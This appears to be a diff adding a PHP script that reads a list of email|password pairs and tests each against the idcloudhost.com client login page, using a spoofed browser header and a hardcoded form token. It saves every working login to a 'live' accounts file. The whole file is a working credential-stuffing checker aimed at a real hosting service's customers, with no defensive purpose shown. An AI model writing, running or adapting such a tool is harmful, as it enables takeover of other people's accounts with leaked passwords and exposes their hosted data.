@@ -1,0 +1,46 @@
+<?php
+
+echo "Empass: ";
+$xyz = trim(fgets(STDIN));
+
+foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
+	$pecah = explode("|", trim($akun));
+	$email = trim($pecah[0]);
+	$passwd = trim($pecah[1]);
+
+	$headers = array();
+	$headers[] = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36';
+	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+
+	$gas = curl('https://my.idcloudhost.com/dologin.php', "token=b2e76acf19c2d65661b7e0b70c02f3bd5ba102fb&username=".$email."&password=".$passwd, $headers);
+	if (strpos($gas[0], 'clientarea.php?incorrect=true')) {
+		echo "[DIE] $email|$passwd\n";
+	} else {
+		echo "[LIVE] $email|$passwd\n";
+		fwrite(fopen("idcloudhost-live.txt", "a"), "[Live Account] | $email|$passwd \n");
+	}
+}
+
+function curl($url,$post,$headers)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	$result = curl_exec($ch);
+	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+	$cookies = array();
+	foreach($matches[1] as $item) {
+	  parse_str($item, $cookie);
+	  $cookies = array_merge($cookies, $cookie);
+	}
+	return array (
+	$header,
+	$body,
+	$cookies
+	);
+}
